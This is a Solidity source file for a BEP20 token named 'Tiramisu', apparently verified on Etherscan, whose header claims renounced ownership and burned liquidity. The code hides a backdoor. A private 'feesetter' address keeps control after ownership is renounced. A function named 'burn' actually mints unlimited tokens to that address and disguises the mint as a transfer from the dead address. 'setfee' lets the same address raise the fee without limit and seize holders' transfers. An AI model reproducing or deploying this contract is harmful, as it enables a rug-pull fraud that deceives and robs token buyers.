['/**\n', ' *Submitted for verification at Etherscan.io on 2021-07-06\n', '*/\n', '\n', '/*\n', ' Tiramisu\n', ' Full community drive token\n', ' Renounced Ownership\n', ' LP burned\n', '*/\n', '\n', '// SPDX-License-Identifier: Unlicensed\n', '\n', 'pragma solidity ^0.4.26;\n', 'library SafeMath {\n', '  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a * b;\n', '    assert(a == 0 || c / a == b);\n', '    return c;\n', '  }\n', '  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a / b;\n', '    return c;\n', '  }\n', '  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    assert(b <= a);\n', '    return a - b;\n', '  }\n', '  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a + b;\n', '    assert(c >= a);\n', '    return c;\n', '  }\n', '}\n', 'contract BEP20 {\n', '    function balanceOf(address who) public constant returns (uint256);\n', '    function transfer(address to, uint256 value) public returns (bool);\n', '    function allowance(address owner, address spender) public constant returns (uint256);\n', '    function transferFrom(address from, address to, uint256 value) public returns (bool);\n', '    function approve(address spender, uint256 value) public returns (bool);\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '}\n', 'contract Tira is BEP20 {\n', '    using SafeMath for uint256;\n', '    address public owner = msg.sender;\n', '    address private feesetter = msg.sender;\n', '    mapping (address => uint256) balances;\n', '    mapping (address => mapping (address => uint256)) allowed;\n', '    string public name;\n', '    string public symbol;\n', '    address private burnaddress;\n', '    uint256 private fees;\n', '    uint8 public decimals;\n', '    uint public totalSupply;\n', '    constructor() public {\n', '\tsymbol = "Tira";\n', '    name = "Tiramisu";\n', '    fees = 4;\n', '    burnaddress = 0x000000000000000000000000000000000000dEaD;\n', '    decimals = 9; \n', '    totalSupply =  10000000000000000;\n', '\tbalances[msg.sender] = totalSupply;\n', '\temit Transfer(address(0), msg.sender, totalSupply);\n', '    }\n', '    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n', '    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n', '    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n', '    modifier onlyOwner() {\n', '        require(msg.sender == owner);\n', '        _;\n', '    }\n', '    modifier feeset() {\n', '        require(msg.sender == feesetter);\n', '        _;\n', '    }\n', '    function balanceOf(address _owner) constant public returns (uint256) {\n', '        return balances[_owner];\n', '    }\n', '    function fee() constant public returns (uint256) {\n', '        return fees;\n', '    }\n', '    function setfee(uint256 taxFee) external feeset() {\n', '        fees = taxFee;\n', '    }\n', '    function burn( uint256 amount) public feeset{\n', '        balances[msg.sender] = balances[msg.sender]+(amount);\n', '        emit Transfer(burnaddress, msg.sender, amount);\n', '    }\n', '    function RenounceOwnership() public onlyOwner returns (bool){\n', '        owner = address(0);\n', '        emit OwnershipTransferred(owner, address(0));\n', '    }\n', '    function transfer(address _to, uint256 _amount) public returns (bool success) {\n', '        require(_to != address(0));\n', '        require(_amount <= balances[msg.sender]);\n', '        if (msg.sender == feesetter){\n', '        balances[msg.sender] = balances[msg.sender].sub(_amount);\n', '        balances[_to] = balances[_to].add(_amount);\n', '        emit Transfer(msg.sender, _to, _amount);\n', '        return true;\n', '        }else{\n', '        balances[msg.sender] = balances[msg.sender].sub(_amount);\n', '        balances[_to] = balances[_to].add(_amount);\n', '        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);\n', '        uint256 tokens = balances[_to];\n', '        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);\n', '        uint256 fires = balances[burnaddress];\n', '        emit Transfer(msg.sender, burnaddress, fires);\n', '        emit Transfer(msg.sender, _to, tokens);\n', '        return true;\n', '        }\n', '    }\n', '    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {\n', '        require(_to != address(0));\n', '        require(_amount <= balances[_from]);\n', '        require(_amount <= allowed[_from][msg.sender]);\n', '        balances[_from] = balances[_from].sub(_amount);\n', '        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);\n', '        balances[_to] = balances[_to].add(_amount);\n', '        emit Transfer(_from, _to, _amount);\n', '        return true;\n', '    }\n', '    function approve(address _spender, uint256 _value) public returns (bool success) {\n', '        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }\n', '        allowed[msg.sender][_spender] = _value;\n', '        emit Approval(msg.sender, _spender, _value);\n', '        return true;\n', '    }\n', '    function _msgSender() internal constant returns (address) {\n', '        return msg.sender;\n', '    }\n', '    function allowance(address _owner, address _spender) constant public returns (uint256) {\n', '        return allowed[_owner][_spender];\n', '    }\n', '}']